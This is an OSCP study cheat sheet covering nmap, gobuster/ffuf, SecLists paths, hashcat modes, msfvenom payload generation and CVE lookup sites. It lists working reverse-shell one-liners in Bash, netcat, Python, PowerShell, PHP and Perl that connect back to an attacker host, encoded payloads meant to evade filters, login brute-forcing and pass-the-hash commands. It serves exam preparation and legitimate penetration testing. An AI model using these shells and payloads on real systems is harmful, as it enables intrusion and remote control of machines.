# OSCP Command & Flags Quick-Reference Appendix

## 1. Nmap — Scanning

### Recommended sequence (first pass on a new host)
1. Fast full TCP port sweep, no scripts (below) — find what's actually open before spending time on `-sC`/`-sV`.
2. Feed those ports into a targeted `-sC -sV` scan (below) — much faster than a `-p- -sC -sV -O` run against all 65535 ports.
3. Kick off the UDP top-100 sweep in the background in parallel with 1–2 — UDP-only services (SNMP, TFTP, NFS, DNS) are the easiest ports to miss on OSCP boxes.
4. Once services are fingerprinted, run `--script vuln` / `nmap-vulners` to flag obvious CVEs before manual digging.
5. Optionally run AutoRecon alongside 1–4 as a safety net (`notes/enum-automation-frameworks.md`) — don't block on it, keep enumerating manually in the foreground.

### Initial full TCP port discovery (fast, all ports)
```bash
nmap -p- --min-rate=1000 -T4 -oA nmap-allports <target>
```
Use `-oA` (not just `-oN`) here — the targeted-rescan step below greps the `.gnmap` output this produces.

### Full TCP scan with service/version detection + default scripts
```bash
nmap -p- -sC -sV -O -oA nmap-full <target>
```
- `-p-` all 65535 TCP ports
- `-sC` default NSE script set
- `-sV` service/version detection
- `-O` OS detection
- `-oA` output in all formats (.nmap/.gnmap/.xml)
- `-oN` normal output only

### Common flag primer
```
-sS      SYN (stealth) scan (default, needs root)
-sT      TCP connect scan (no root needed)
-sU      UDP scan
-sn      Host discovery only (no port scan / ping sweep)
-Pn      Skip host discovery, treat host as up
-n       No DNS resolution (speed)
-v / -vv Verbosity
-T4      Aggressive timing (T0 slowest - T5 fastest)
--open   Show only open ports
-A       Aggressive: OS detect + version + scripts + traceroute
-6       Scan an IPv6 target (combine with -sS/-sC/-sV/-p- as normal)
```

### IPv6 target
```bash
nmap -6 -p- -sC -sV -oA nmap-ipv6 <target-ipv6-address-or-scope-id>
```
Same flags as IPv4 — just add `-6` and pass the IPv6 literal (link-local addresses need a zone/scope ID, e.g. `fe80::1%eth0`). Relevant mainly on AD segments where mitm6 is in play (`notes/password-attacks-advanced.md`) or a host is dual-stack; standalone OSCP boxes are IPv4 almost always.

### UDP scan (top ports — full UDP is slow, scope common ports first)
```bash
nmap -sU --top-ports 100 -T4 -oA nmap-udp-top100 <target>
sudo nmap -sU -p- --min-rate=1000 -T4 -oA nmap-udp-all <target>
```

### Feed discovered open ports back into a targeted deep scan
```bash
# Extract open TCP ports from previous grepable output
ports=$(grep -oP '\d{1,5}(?=/open)' nmap-allports.gnmap | tr '\n' ',' | sed 's/,$//')
nmap -p$ports -sC -sV -oN nmap-targeted.txt <target>

# Same pattern for UDP — version/script-scan just the UDP ports found open above
udp_ports=$(grep -oP '\d{1,5}(?=/open(\|filtered)?/udp)' nmap-udp-top100.gnmap | tr '\n' ',' | sed 's/,$//')
sudo nmap -sU -p$udp_ports -sC -sV -oN nmap-udp-targeted.txt <target>
```

### NSE vulnerability scripts
```bash
# Run default + vuln category scripts
nmap -p- -sV --script vuln -oN nmap-vuln.txt <target>

# Common specific NSE scripts used on OSCP
nmap -p445 --script "smb-vuln*" <target>
nmap -p445 --script smb-os-discovery,smb-enum-shares,smb-enum-users <target>
nmap -p139,445 --script smb-vuln-ms17-010 <target>          # EternalBlue check
nmap -p21 --script ftp-anon,ftp-syst <target>
nmap -p22 --script ssh2-enum-algos,ssh-auth-methods <target>
nmap -p25 --script smtp-enum-users,smtp-open-relay <target>
nmap -p111 --script rpcinfo <target>
nmap -p2049 --script nfs-ls,nfs-showmount,nfs-statfs <target>
nmap -p3306 --script mysql-info,mysql-empty-password <target>
nmap -p1433 --script ms-sql-info,ms-sql-empty-password <target>
nmap -p161 -sU --script snmp-info,snmp-processes,snmp-netstat <target>
nmap --script http-enum -p80,443 <target>
nmap --script "http-vuln*" -p80,443 <target>
nmap --script "default,vuln" -oA nmap-vulnscan <target>

# Set script args (e.g. userdb for brute scripts)
nmap --script smb-brute --script-args userdb=users.txt,passdb=pass.txt -p445 <target>
```

### nmap-vulners (vulners.com CVE lookup NSE script)
Cross-references `-sV` version-detection output against the vulners.com CVE database and prints matching CVE IDs + CVSS scores per service. Not bundled with stock nmap on all distros — install once, then it runs like any other `--script`.
```bash
# Install (one-time)
git clone https://github.com/vulnersCom/nmap-vulners.git
cp nmap-vulners/vulners.nse ~/.nmap/scripts/      # or /usr/share/nmap/scripts/ on Kali
nmap --script-updatedb

# Usage — requires -sV (it reads the detected product/version strings)
nmap -sV --script vulners <target>
nmap -sV --script vulners --script-args mincvss=7.0 -p- <target>   # only CVSS >= 7.0
```

---

## 2. Directory/Content Discovery — gobuster / feroxbuster / ffuf

### gobuster (dir mode)
```bash
gobuster dir -u http://<target> \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,html,bak -t 50 -o gobuster-dir.txt

# Common flags
-u   target URL
-w   wordlist
-x   extensions to append (comma separated)
-t   threads
-s   status codes to show (default is fine usually)
-b   status codes to blacklist (e.g. 404)
-k   ignore SSL cert errors
-c   cookies (auth session)
-r   follow redirects
```

### gobuster (dns / vhost / vhost fuzzing)
```bash
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

gobuster vhost -u http://<target> \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain -t 50
```

### feroxbuster
```bash
feroxbuster -u http://<target> \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,txt,bak,html -t 50 -d 2 -o ferox-out.txt

# Common flags
-u    URL
-w    wordlist
-x    extensions
-t    threads
-d    recursion depth (0 = infinite)
-C    status codes to filter/exclude (e.g. -C 404)
-k    ignore SSL errors
-A    random user-agent
--dont-extract-links   don't auto-add extracted links to scan
-q    quiet
```

### ffuf (dir, extension, vhost, POST/param fuzzing)
```bash
# Directory/file fuzzing
ffuf -u http://<target>/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc 200,204,301,302,307,401,403 -t 50 -o ffuf-out.json -of json

# Extension fuzzing
ffuf -u http://<target>/indexFUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt

# VHost fuzzing (Host header)
ffuf -u http://<target> -H "Host: FUZZ.<domain>" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs <baseline_size>

# POST parameter / login brute
ffuf -u http://<target>/login -X POST \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt \
  -fc 401

# Common flags
-u    URL with FUZZ keyword
-w    wordlist (append :KEYWORD, e.g. -w list1.txt:FUZZ1 -w list2.txt:FUZZ2, for multiple simultaneous wordlists)
-X    HTTP method
-d    POST data
-H    header
-mc   match HTTP codes
-fc   filter (hide) HTTP codes
-fs   filter by response size
-t    threads
-recursion -recursion-depth N   recurse into found dirs
```

---

## 3. SecLists Wordlist Paths (Kali default install: `/usr/share/seclists/`)

### Directories / files (web content)
```
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
/usr/share/seclists/Discovery/Web-Content/web-extensions.txt
```

### Subdomains / DNS
```
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
/usr/share/seclists/Discovery/DNS/namelist.txt
```

### Usernames
```
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### Passwords
```
/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt
/usr/share/seclists/Passwords/Common-Credentials/best1050.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
/usr/share/seclists/Passwords/Common-Credentials/probable-v2_top-1575.txt
/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt
```

### SNMP / Common misc
```
/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
/usr/share/seclists/Discovery/SNMP/snmp.txt
/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
```

### rockyou.txt (default Kali location, not under seclists)
```bash
gunzip /usr/share/wordlists/rockyou.txt.gz    # extracts to /usr/share/wordlists/rockyou.txt
```

---

## 4. Hashcat `-m` Mode Reference

| Hash Type                          | `-m` Mode | Notes |
|-------------------------------------|-----------|-------|
| MD5                                  | 0         | raw md5 |
| SHA1                                 | 100       | raw sha1 |
| SHA256                               | 1400      | raw sha256 |
| SHA512                               | 1700      | raw sha512 |
| md5crypt ($1$, Unix)                 | 500       | /etc/shadow legacy |
| sha256crypt ($5$, Unix)              | 7400      | |
| sha512crypt ($6$, Unix)              | 1800      | modern /etc/shadow |
| bcrypt ($2*$)                        | 3200      | slow, GPU-heavy |
| NTLM                                 | 1000      | Windows SAM/local hash |
| NetNTLMv1                            | 5500      | |
| NetNTLMv2                            | 5600      | Responder/relay captures |
| Kerberos 5 TGS-REP etype 23 (Kerberoast) | 13100 | `.kirbi`/hashcat TGS format |
| Kerberos 5 AS-REP etype 23 (AS-REP Roast) | 18200 | no-preauth accounts |
| Kerberos 5 AS-REQ Pre-Auth (etype 23)| 7500      | |
| LM                                   | 3000      | legacy Windows |
| MSSQL (2012+)                        | 1731      | |
| MySQL 4.1+ (sha1(sha1))              | 300       | |
| Postgres MD5                         | 12        | |
| Cisco type 7                         | (no hashcat, decode manually) | use `msfconsole`/online decoder |
| Cisco-IOS $8$/$9$ (PBKDF2/scrypt)     | 9200 / 9300 | |
| WPA/WPA2 (PBKDF2) / WPA-PBKDF2-PMKID | 22000     | modern unified mode |
| ZIP (PKZIP/AES)                      | 17200 / 13600 | |
| RAR5                                 | 13000     | |
| PDF 1.4-1.6 (Acrobat 5-8)             | 10500     | |
| Django (PBKDF2-SHA256)               | 10000     | |
| Oracle 11g                           | 112       | |
| Wordpress (phpass)                   | 400       | |
| JWT (HS256)                          | 16500     | crack the HMAC secret of a JSON Web Token |
| KeePass 1/2 (.kdbx)                  | 13400     | via keepass2john |

### `-a` Attack Mode Primer
```
-a 0   Straight (wordlist)                    hashcat -m 0 hash.txt wordlist.txt
-a 1   Combinator (wordlist1 x wordlist2)      hashcat -m 0 hash.txt wordlist1.txt wordlist2.txt
-a 3   Brute-force / mask                      hashcat -m 0 hash.txt ?d?d?d?d?d?d?d?d
-a 6   Hybrid wordlist + mask (append)         hashcat -m 0 hash.txt wordlist.txt ?d?d     (e.g. password + 2 digits)
-a 7   Hybrid mask + wordlist (prepend)        hashcat -m 0 hash.txt ?d?d wordlist.txt
```
Mask charsets: `?l` lower, `?u` upper, `?d` digit, `?s` special, `?a` all.

### Common hashcat invocation patterns
```bash
# Straight wordlist attack
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Wordlist + rules
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Kerberoast
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt

# AS-REP Roast
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

# NetNTLMv2 (Responder capture)
hashcat -m 5600 responder.hash /usr/share/wordlists/rockyou.txt

# Show cracked results already in potfile
hashcat -m 1000 hashes.txt --show

# Brute-force mask attack (e.g. 8-digit numeric PIN)
hashcat -m 0 hash.txt -a 3 ?d?d?d?d?d?d?d?d
```

**Faster (nxc):** once a hash cracks (or even without cracking, for pass-the-hash), validate it directly against the target instead of hand-testing logins:
```bash
nxc smb <target_or_range> -u <user> -p <cracked_password>
nxc smb <target_or_range> -u <user> -H <ntlm_hash>   # pass-the-hash, no cracking needed
```

---

## 5. msfvenom Payload Generation

**Exam scope reminder:** Metasploit/Meterpreter (including msfvenom-generated `meterpreter` payloads and `msf` exploit modules) may be used against only ONE non-AD exam machine for the whole exam, and never for pivoting. Prefer the non-meterpreter `shell_reverse_tcp`/`cmd` payloads below for everything else.

### Windows reverse shell (EXE)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f exe -o shell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f exe -o met.exe
```

### Linux reverse shell (ELF)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f elf -o shell.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f elf -o met.elf
```

### PHP reverse shell
```bash
msfvenom -p php/reverse_php LHOST=<attacker_ip> LPORT=443 -f raw -o shell.php
```

### ASP / ASPX reverse shell (IIS)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f asp -o shell.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f aspx -o shell.aspx
```
- If the target IIS app pool is 64-bit only (`Enable 32-Bit Applications` = False), the x86 payload above fails to load — use `windows/x64/meterpreter/reverse_tcp` (or `windows/x64/shell_reverse_tcp`) instead.

### JSP / WAR (Tomcat)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw -o shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f war -o shell.war
```

### Python / Bash raw payload
```bash
msfvenom -p cmd/unix/reverse_python LHOST=<attacker_ip> LPORT=443 -f raw
msfvenom -p cmd/unix/reverse_bash LHOST=<attacker_ip> LPORT=443 -f raw -o shell.sh
```

### Encoded / staged options (bypass basic filters)
```bash
msfvenom -p windows/x86/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 \
  -e x86/shikata_ga_nai -i 5 -f exe -o shell_enc.exe

# x64 payload requires an x64-compatible encoder (shikata_ga_nai is x86-only)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 \
  -e x64/xor -i 5 -f exe -o shell_enc_x64.exe

# Common -f formats: exe, elf, raw, war, asp, aspx, jsp, psh (powershell), dll, macho
```

Raw shellcode for exploit adaptation: `msfvenom -p windows/shell_reverse_tcp ... -b '\x00\x0a\x0d' -f c` — see [`notes/public-exploit-adaptation.md`](notes/public-exploit-adaptation.md) for the full workflow.

---

## 6. Reverse Shell One-Liners

| Shell Type | Command |
|---|---|
| **Bash** | `bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1` |
| **Bash (alt)** | `0<&196;exec 196<>/dev/tcp/<attacker_ip>/<port>; sh <&196 >&196 2>&196` |
| **Netcat (classic)** | `nc -e /bin/sh <attacker_ip> <port>` |
| **Netcat (no -e)** | contains a `\|` pipe — see fenced block below (table cells can't hold a literal `\|` safely) |
| **Netcat (traditional/GNU, -e)** | `nc.traditional -e /bin/sh <attacker_ip> <port>` (OpenBSD `nc`, the Kali/Debian default, strips `-e`/`-c` execution support — use `nc.traditional` or `ncat --exec /bin/sh <attacker_ip> <port>` instead) |
| **Python3** | `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'` |
| **PowerShell** | contains `\|` pipes — see fenced block below (table cells can't hold a literal `\|` safely) |
| **PHP** | `php -r '$sock=fsockopen("<attacker_ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'` |
| **Perl** | `perl -e 'use Socket;$i="<attacker_ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` |
| **socat** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker_ip>:<port>` |
| **Listener (attacker)** | `nc -lvnp <port>` |
| **Listener (rlwrap, stable)** | `rlwrap nc -lvnp <port>` |
| **Listener (socat, full PTY)** | `socat file:$(tty),raw,echo=0 tcp-listen:<port>` — pair with the socat payload above to keep raw-tty/job-control instead of a bare shell |

Commands with literal pipes, kept out of the table above (raw markdown escapes `\|` for GFM table cells — paste from these fenced blocks, not the table, to avoid copying stray backslashes):
```bash
# Netcat (no -e), mkfifo named-pipe shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> <port> >/tmp/f
```
```powershell
# PowerShell TCP reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Shell stabilization (after landing on Linux target)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z on attacker, then:
stty raw -echo; fg
# then on target shell:
reset
export SHELL=bash
stty rows <N> columns <N>   # match local terminal size
```

---

## 7. CVE / Exploit Lookup by Service + Version

Once `nmap -sV` (or banner grabbing) gives you a product and version string, feed it into these — most take a free-text `<software> <version>` query directly, e.g. `wordpress 4.7`, `openssh 7.2`, `linux kernel 5.4`, `vsftpd 2.3.4`.

| Tool / Site | Type | Query pattern | Notes |
|---|---|---|---|
| **searchsploit** (offline Exploit-DB mirror, ships with Kali) | CLI | `searchsploit wordpress 4.7` | Fastest first check, no network needed; `-w` prints the online exploit-db.com URL, `-m <id>` copies a PoC locally; `searchsploit --nmap nmap-full.xml` (requires `-oX`/`-oA` nmap XML output) auto-cross-references every detected service/version in one shot |
| [Exploit-DB](https://www.exploit-db.com/search) | Web | Product + version filter fields | Canonical source `searchsploit` mirrors; check here if the local DB is stale |
| [vulners.com](https://vulners.com/) | Web + API | `wordpress 4.7` in the search bar | Aggregates NVD/CVE + vendor advisories + exploit refs in one result list; backs the `nmap-vulners` NSE script above |
| [cvedetails.com version search](https://www.cvedetails.com/version-search.php) | Web | Vendor / product / version dropdowns | Best when you know exact vendor+product; supports one trailing wildcard (e.g. `4.7*`); results cap at 100 per query so add the version to narrow a popular product |
| [NVD search](https://nvd.nist.gov/vuln/search) | Web + API | Keyword search, e.g. `vsftpd 2.3.4` | Authoritative CVE descriptions/CVSS/CPE; slower to update with exploit links than vulners/Exploit-DB |
| [sploitus.com](https://sploitus.com/) | Web | `apache struts 2.3` | Search engine over Exploit-DB, Metasploit, GitHub PoC repos, and Packet Storm in one query |
| [Rapid7 Vulnerability & Exploit DB](https://www.rapid7.com/db/) | Web | `<product> <version>` search box | Cross-links matching Metasploit module names directly — useful to jump straight to `msfconsole` (remember the one-machine, non-AD, no-pivoting Metasploit exam limit before firing the module) |
| [Packet Storm Security](https://packetstormsecurity.com/search/?q=) | Web | `<product> <version>` | Good secondary source when Exploit-DB has no PoC for a niche CVE |
| `msf > search` (Metasploit) | CLI | `search type:exploit name:wordpress` or `search cve:2021-41773` | Cross-check once you have a candidate CVE — confirms whether a ready module exists before hand-rolling a PoC; actually running an exploit module still counts against the one-machine Metasploit exam limit |
| [GitHub Advisory DB](https://github.com/advisories) | Web | Filter by ecosystem + package name/version | Best for app-level library CVEs (npm/pip/composer/gem packages) rather than network services |

**Workflow tip:** run `searchsploit <product> <version>` first (fast, offline, works without exam network egress concerns), then confirm/deepen with `vulners.com` or `nvd.nist.gov` if searchsploit comes up empty or you need the full CVE writeup for the exam report.
